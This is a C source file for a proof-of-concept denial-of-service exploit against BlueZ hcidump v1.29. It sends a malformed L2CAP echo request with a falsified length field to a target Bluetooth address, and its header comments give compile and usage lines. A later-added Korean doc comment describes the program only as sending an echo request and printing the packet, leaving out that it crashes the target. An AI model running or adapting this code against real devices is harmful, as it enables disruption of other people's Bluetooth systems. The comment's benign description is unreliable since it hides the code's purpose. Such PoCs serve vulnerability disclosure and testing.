/*	Bluez hcidump v1.29 DoS - PoC code			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	01/18/06						*/
/*	Crashes hcidump sending bad L2CAP packet		*/
/*								*/
/*	gcc -lbluetooth hcidump-crash.c -o hcidump-crash	*/
/*	./hcidump-crash 00:80:37:XX:XX:XX			*/
/*	L2CAP packet sent (15)					*/
/*	Buffer: 08 01 0C 00 41 41 41 41 41 41 41 41 41 41 41	*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

/**
 * main - 주어진 Bluetooth 주소로 L2CAP 에코 요청을 보내는 프로그램
 * @argc: 인수의 개수
 * @argv: 인수의 배열, argv[1]은 블루투스 주소
 *
 * 프로그램 설명:
 * 이 프로그램은 주어진 Bluetooth 주소로 L2CAP 에코 요청을 보내고, 
 * 보내진 패킷의 내용을 출력하는 역할을 합니다.
 * 
 * 동작 과정:
 * 1. 필요한 소켓을 초기화합니다.
 * 2. 주어진 Bluetooth 주소로 연결을 시도합니다.
 * 3. 연결이 성공하면, L2CAP 에코 요청 패킷을 생성하여 전송합니다.
 * 4. 성공적으로 전송된 패킷 내용을 출력합니다.
 * 5. 할당된 메모리를 해제하고 소켓을 닫습니다.
 * 
 * 리턴 값:
 * 성공적으로 수행되면 EXIT_SUCCESS(0)를 반환합니다.
 * 에러가 발생하면 프로그램은 오류 메시지를 출력하고 종료합니다.
 */
int main(int argc, char **argv)
{
	char *buffer;
	l2cap_cmd_hdr *cmd;	
	struct sockaddr_l2 addr;
	int sock, sent, i;

	if(argc < 2)
	{
		fprintf(stderr, "%s <btaddr>\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;

	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
	{
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(argv[1], &addr.l2_bdaddr);
	
	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
	{
		perror("connect");
		exit(EXIT_FAILURE);
	}
	
	if(!(buffer = (char *) malloc ((int) SIZE + 1))) 
	{
		perror("malloc");
		exit(EXIT_FAILURE);
	}
	
	memset(buffer, 'A', SIZE);

	cmd = (l2cap_cmd_hdr *) buffer;
	cmd->code = L2CAP_ECHO_REQ;
	cmd->ident = 1;
	cmd->len = FAKE_SIZE;
	
	if( (sent=send(sock, buffer, SIZE, 0)) >= 0)
	{
		printf("L2CAP packet sent (%d)\n", sent);
	}

	printf("Buffer:\t");
	for(i=0; i<sent; i++)
		printf("%.2X ", (unsigned char) buffer[i]);
	printf("\n");

	free(buffer);
	close(sock);
	return EXIT_SUCCESS;
}
